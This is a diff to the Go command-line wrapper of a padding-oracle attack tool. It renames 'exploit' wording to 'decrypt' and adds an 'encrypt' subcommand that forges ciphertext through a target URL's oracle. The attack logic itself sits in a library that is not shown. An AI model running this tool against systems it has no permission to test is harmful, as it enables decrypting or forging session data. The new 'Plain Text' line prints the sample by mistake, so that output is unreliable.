@@ -17,9 +17,12 @@ var sample string
 var cookies string
 var blockSize int = 16
 var method string = http.MethodGet
+var plaintext string
 
 func init() {
 	rootCmd.AddCommand(decryptCmd)
+	rootCmd.AddCommand(encryptCmd)
+	encryptCmd.Flags().StringVarP(&plaintext, "plain-text", "p", plaintext, "Plaintext to encrypt.")
 	rootCmd.PersistentFlags().StringVarP(&url, "url", "u", url, "The URL of the suspected padding oracle. Required.")
 	rootCmd.PersistentFlags().StringVarP(&sample, "sample", "s", sample, "A sample of encrypted data, which can be base64 and/or url encoded. This sample should also appear at least one of the --url/--cookies. Required,")
 	rootCmd.PersistentFlags().StringVarP(&cookies, "cookies", "c", cookies, "A string containing cookies. e.g. \"PHPSESSID=123456536;LOC=1;X=NO\".")
@@ -35,7 +38,7 @@ func main() {
 }
 
 var rootCmd = &cobra.Command{
-	Short: "Exploit padding oracles for fun and profit",
+	Short: "Decrypt padding oracles for fun and profit",
 }
 
 var decryptCmd = &cobra.Command{
@@ -59,9 +62,9 @@ var decryptCmd = &cobra.Command{
 			Cookies:   cookies,
 		}
 
-		output, err := pax.Exploit(url, sample, &options)
+		output, err := pax.Decrypt(url, sample, &options)
 		if err != nil {
-			tml.Printf("<red>Exploit failed: %s</red>\n", err)
+			tml.Printf("<red>Decryption failed: %s</red>\n", err)
 			os.Exit(1)
 		}
 
@@ -70,6 +73,49 @@ var decryptCmd = &cobra.Command{
 		tml.Printf("URL:        %s\n", url)
 		tml.Printf("Input:      %s\n", sample)
 		tml.Printf("Plaintext:\n\n%s\n\n", string(output))
+
+	},
+}
+
+var encryptCmd = &cobra.Command{
+	Use:   "encrypt",
+	Short: "attempt to encrypt data by exploiting a potential padding oracle",
+	Run: func(cmd *cobra.Command, args []string) {
+
+		if url == "" {
+			tml.Printf("<red>You must supply a --url - run with the --help flag for details</red>\n")
+			os.Exit(1)
+		}
+
+		if sample == "" {
+			tml.Printf("<red>You must supply a --sample - run with the --help flag for details</red>\n")
+			os.Exit(1)
+		}
+
+		if plaintext == "" {
+			tml.Printf("<red>You must supply a --plain-text - run with the --help flag for details</red>\n")
+			os.Exit(1)
+		}
+
+		options := pax.ExploitOptions{
+			BlockSize: blockSize,
+			Method:    method,
+			Cookies:   cookies,
+			PlainText: plaintext,
+		}
+
+		output, err := pax.Encrypt(url, sample, &options)
+		if err != nil {
+			tml.Printf("<red>Encryption failed: %s</red>\n", err)
+			os.Exit(1)
+		}
+
+		tml.Printf("<green>Encryption successful:</green>\n\n")
+
+		tml.Printf("URL:        %s\n", url)
+		tml.Printf("Input:      %s\n", sample)
+		tml.Printf("Plain Text: %s\n", sample)
+		tml.Printf("Encrypted:\n\n%s\n\n", string(output))
 
 	},
 }
